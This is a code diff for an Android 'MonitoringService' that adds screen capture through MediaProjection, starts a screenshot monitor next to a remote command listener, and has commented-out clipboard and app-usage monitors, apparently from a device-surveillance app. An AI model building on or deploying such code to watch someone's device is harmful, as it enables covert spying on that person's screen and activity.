@@ -6,10 +6,14 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.text.TextUtils;
 import android.util.Log;
+import java.net.URISyntaxException;
 
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
@@ -20,7 +24,14 @@ public class MonitoringService extends Service {
     private static final String TAG = "MonitoringService";
     private static final String CHANNEL_ID = "MonitoringServiceChannel";
     private CommandListener commandListener; // CommandListener initialization
+    private MediaProjection mediaProjection;
+    private ScreenshotHelper screenshotHelper;
 
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        screenshotHelper = new ScreenshotHelper(this);
+    }
 
     @Nullable
     @Override
@@ -30,6 +41,24 @@ public class MonitoringService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.hasExtra("resultCode")) {
+            try {
+                int resultCode = intent.getIntExtra("resultCode", 0);
+                Intent data = Intent.parseUri(intent.getStringExtra("intentData"), Intent.URI_INTENT_SCHEME);
+
+                MediaProjectionManager projectionManager =
+                        (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+
+                if (mediaProjection != null) {
+                    screenshotHelper.setMediaProjection(mediaProjection);
+                }
+            } catch (URISyntaxException e) {
+                Log.e(TAG, "Error parsing intent URI: " + e.getMessage());
+                return START_NOT_STICKY;
+            }
+        }
+
         Log.d(TAG, "Service started");
 
         // Check if required permissions and accessibility service are granted
@@ -50,7 +79,17 @@ public class MonitoringService extends Service {
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
 
-        startForeground(1, notification);
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+            } else {
+                startForeground(1, notification);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting foreground service: " + e.getMessage());
+            stopSelf();
+            return START_NOT_STICKY;
+        }
 
         startMonitoringService(); // Start monitoring tasks
         return START_STICKY;
@@ -94,6 +133,7 @@ public class MonitoringService extends Service {
             //startAppUsageMonitor(userId, phoneModel);
             //startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
             initializeCommandListener(userId, phoneModel); // Initialize CommandListener
+            startScreenshotMonitor(userId, phoneModel); // Initialize ScreenshotMonitor
 
 
         } catch (Exception e) {
@@ -167,6 +207,12 @@ public class MonitoringService extends Service {
         Log.d(TAG, "Initializing Command Listener");
         commandListener = new CommandListener(userId, phoneModel, this); // Pass the context
         commandListener.startListeningForCommands(); // Start listening for commands
+    }
+
+    private void startScreenshotMonitor(String userId, String phoneModel) {
+        Log.d(TAG, "Initializing Screenshot Monitor");
+        ScreenshotMonitor screenshotMonitor = new ScreenshotMonitor(this); // Adjusted constructor
+        screenshotMonitor.startMonitoring(); // Start monitoring screenshots without arguments
     }
 
     private void createNotificationChannel() {
